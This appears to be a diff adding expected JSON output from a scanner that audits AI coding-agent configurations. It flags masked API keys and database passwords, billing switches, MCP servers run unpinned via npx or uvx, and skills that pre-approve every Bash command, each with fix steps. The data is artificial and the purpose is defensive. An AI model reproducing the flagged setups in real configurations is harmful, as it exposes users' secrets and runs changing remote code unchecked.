+      "why": "The credential is passed on the server's command line, where every process listing and config backup can see it.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.acme-helper.headersHelper"
+      },
+      "evidence": "ghp_••••f9a",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pass the credential through an environment reference instead",
+        "steps": [
+          "Export the value in your shell environment (or a secret manager).",
+          "Replace the literal with a reference such as `${DATABASE_URL}`.",
+          "Rotate the credential if the file was ever shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "77d18f206cd96149"
+      ],
+      "tags": []
+    },
+    {
+      "id": "210e689c85e125b3",
+      "rule": "SEC-002",
+      "category": "secret",
+      "severity": "medium",
+      "title": "Database password in args",
+      "why": "The credential is passed on the server's command line, where every process listing and config backup can see it.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.mcp.json",
+        "line": null,
+        "key_path": "mcpServers.postgres.args[2]"
+      },
+      "evidence": "postgresql://app:••••@db.acme.internal:5432/acme",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pass the credential through an environment reference instead",
+        "steps": [
+          "Export the value in your shell environment (or a secret manager).",
+          "Replace the literal with a reference such as `${DATABASE_URL}`.",
+          "Rotate the credential if the file was ever shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "340112704c3eb103"
+      ],
+      "tags": []
+    },
+    {
+      "id": "9fa81e9c47f86114",
+      "rule": "SEC-004",
+      "category": "secret",
+      "severity": "medium",
+      "title": "OpenAI API key in plain text",
+      "why": "Every program you run inherits this variable, and the profile is plain text that backups and dotfile syncs copy around.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 11,
+        "key_path": "OPENAI_API_KEY"
+      },
+      "evidence": "OPENAI_API_KEY=sk-proj-••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Load the credential at use time instead of exporting it",
+        "steps": [
+          "Remove the export from the profile.",
+          "Load it when needed: `export VAR=\"$(op read 'op://…')\"` or `security find-generic-password -w`.",
+          "Rotate the credential if the profile was ever synced or shared."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "f50c7fbec3cebc70"
+      ],
+      "tags": []
+    },
+    {
+      "id": "e956d132291c426d",
+      "rule": "SEC-004",
+      "category": "secret",
+      "severity": "medium",
+      "title": "GitHub token in plain text",
+      "why": "Every program you run inherits this variable, and the profile is plain text that backups and dotfile syncs copy around.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 13,
+        "key_path": "COPILOT_GITHUB_TOKEN"
+      },
+      "evidence": "COPILOT_GITHUB_TOKEN=ghu_••••b1c",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Load the credential at use time instead of exporting it",
+        "steps": [
+          "Remove the export from the profile.",
+          "Load it when needed: `export VAR=\"$(op read 'op://…')\"` or `security find-generic-password -w`.",
+          "Rotate the credential if the profile was ever synced or shared."
+        ]
+      },
+      "agents": [
+        "copilot_cli"
+      ],
+      "items": [
+        "7ced167df52843d7"
+      ],
+      "tags": [
+        "BILL-009"
+      ]
+    },
+    {
+      "id": "f5bfa5a3383e0217",
+      "rule": "SEC-005",
+      "category": "secret",
+      "severity": "medium",
+      "title": "Database password in .env",
+      "why": "A `.env` file at the repository root is loaded by tooling and read by agents working in the folder, and is easy to commit by mistake.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.env",
+        "line": 1,
+        "key_path": "DATABASE_URL"
+      },
+      "evidence": "DATABASE_URL=postgresql://app:••••@db.acme.internal:5432/acme",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Keep secrets out of the repository's `.env`",
+        "steps": [
+          "Check that `.env` is listed in `.gitignore`.",
+          "Move the value to a secret manager or an env file outside the repository.",
+          "Rotate the credential if the file was ever committed."
+        ]
+      },
+      "agents": [
+        "claude_code",
+        "codex"
+      ],
+      "items": [
+        "79606c02e6476130"
+      ],
+      "tags": []
+    },
+    {
+      "id": "4011e0d2836f0445",
+      "rule": "SEC-005",
+      "category": "secret",
+      "severity": "medium",
+      "title": "OpenAI API key in .env",
+      "why": "A `.env` file at the repository root is loaded by tooling and read by agents working in the folder, and is easy to commit by mistake.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.env",
+        "line": 2,
+        "key_path": "OPENAI_API_KEY"
+      },
+      "evidence": "OPENAI_API_KEY=sk-proj-••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Keep secrets out of the repository's `.env`",
+        "steps": [
+          "Check that `.env` is listed in `.gitignore`.",
+          "Move the value to a secret manager or an env file outside the repository.",
+          "Rotate the credential if the file was ever committed."
+        ]
+      },
+      "agents": [
+        "claude_code",
+        "codex"
+      ],
+      "items": [
+        "b9eb0996e7cd1e7f"
+      ],
+      "tags": []
+    },
+    {
+      "id": "4e3405013fbcce85",
+      "rule": "BILL-005",
+      "category": "billing",
+      "severity": "low",
+      "title": "Cloud provider switch is on",
+      "why": "With this switch on, Claude Code sends requests to the cloud provider and bills that account instead of your subscription.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 9,
+        "key_path": "CLAUDE_CODE_USE_BEDROCK"
+      },
+      "evidence": "CLAUDE_CODE_USE_BEDROCK (set)",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Switch it off unless you mean to use the cloud provider",
+        "steps": [
+          "Remove the variable, or set it only in the shell that needs it."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "097927b3e569c781"
+      ],
+      "tags": []
+    },
+    {
+      "id": "a119078314d57936",
+      "rule": "BILL-007",
+      "category": "billing",
+      "severity": "low",
+      "title": "Uses a custom provider",
+      "why": "Codex usage is billed to the API key or custom provider rather than counted against a ChatGPT plan.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 8,
+        "key_path": "model_provider"
+      },
+      "evidence": "model_provider = \"proxy\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Sign in with ChatGPT if you want plan billing",
+        "steps": [
+          "Run `codex logout`, then `codex login` and choose ChatGPT.",
+          "Remove `model_provider` or `openai_base_url` from `config.toml` if they point at a custom provider you do not need."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "39ada95a74b60c08"
+      ],
+      "tags": []
+    },
+    {
+      "id": "b19152237b7b8095",
+      "rule": "BILL-009",
+      "category": "billing",
+      "severity": "low",
+      "title": "Token overrides Copilot login",
+      "why": "Copilot CLI uses this token ahead of its own login, so sessions run as whatever that token can reach.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 20,
+        "key_path": "GITHUB_TOKEN"
+      },
+      "evidence": "GITHUB_TOKEN (set at run time)",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Unset the token for Copilot sessions",
+        "steps": [
+          "Remove the export, or set it only in the shell that needs it.",
+          "Sign in with `copilot login` (or `gh auth login`) for the stored login to apply."
+        ]
+      },
+      "agents": [
+        "copilot_cli"
+      ],
+      "items": [
+        "ca715461c0230fa4"
+      ],
+      "tags": []
+    },
+    {
+      "id": "6937418cc704c38d",
+      "rule": "RISK-001",
+      "category": "risk",
+      "severity": "low",
+      "title": "MCP server on @latest",
+      "why": "A floating version means the code this server runs can change under the agent without any configuration change.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.lint-helper"
+      },
+      "evidence": "npx -y @acme/lint-helper@latest",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pin the server to an exact version",
+        "steps": [
+          "Replace the tag or missing version with an exact one: `pkg@1.2.3` for npx, `pkg==1.2.3` for uvx, `image@sha256:…` for Docker.",
+          "Re-pin when you update, on purpose."
+        ]
+      },
+      "agents": [
+        "claude_code",
+        "codex"
+      ],
+      "items": [
+        "679563aca0569ede",
+        "3d4d86fad6ad8577"
+      ],
+      "tags": []
+    },
+    {
+      "id": "bad5a72d6a7bfe44",
+      "rule": "RISK-001",
+      "category": "risk",
+      "severity": "low",
+      "title": "MCP server on @latest",
+      "why": "A floating version means the code this server runs can change under the agent without any configuration change.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.playwright"
+      },
+      "evidence": "npx @playwright/mcp@latest",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pin the server to an exact version",
+        "steps": [
+          "Replace the tag or missing version with an exact one: `pkg@1.2.3` for npx, `pkg==1.2.3` for uvx, `image@sha256:…` for Docker.",
+          "Re-pin when you update, on purpose."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "785171efac47c488"
+      ],
+      "tags": []
+    },
+    {
+      "id": "d987f956f24121e3",
+      "rule": "RISK-001",
+      "category": "risk",
+      "severity": "low",
+      "title": "MCP server unpinned",
+      "why": "A floating version means the code this server runs can change under the agent without any configuration change.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 33,
+        "key_path": "mcp_servers.fetch"
+      },
+      "evidence": "uvx mcp-server-fetch",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pin the server to an exact version",
+        "steps": [
+          "Replace the tag or missing version with an exact one: `pkg@1.2.3` for npx, `pkg==1.2.3` for uvx, `image@sha256:…` for Docker.",
+          "Re-pin when you update, on purpose."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "c279255636728a66"
+      ],
+      "tags": []
+    },
+    {
+      "id": "c8b54c995f3f3089",
+      "rule": "RISK-007",
+      "category": "risk",
+      "severity": "low",
+      "title": "Skill can run any command",
+      "why": "The skill pre-approves every shell command while it runs.",
+      "location": {
+        "path": "[HOME]/.claude/plugins/cache/acme-tools/acme-deploy/0.3.1/skills/deploy-check/SKILL.md",
+        "line": null,
+        "key_path": "allowed-tools"
+      },
+      "evidence": "allowed-tools: Bash",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Restrict `allowed-tools` to the commands the skill needs",
+        "steps": [
+          "Replace `Bash` with specific rules such as `Bash(git status *)`."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "60c9382e3f002d25"
+      ],
+      "tags": []
+    },
+    {
+      "id": "b912024d306d2a11",
+      "rule": "RISK-007",
+      "category": "risk",
+      "severity": "low",
+      "title": "Skill can run any command",
+      "why": "The skill pre-approves every shell command while it runs.",
+      "location": {
+        "path": "[HOME]/.claude/skills/yolo/SKILL.md",
+        "line": null,
+        "key_path": "allowed-tools"
+      },
+      "evidence": "allowed-tools: Bash",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Restrict `allowed-tools` to the commands the skill needs",
+        "steps": [
+          "Replace `Bash` with specific rules such as `Bash(git status *)`."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "38d3d52d3ed7e107"
+      ],
+      "tags": []
+    }
+  ],
+  "warnings": []
+}
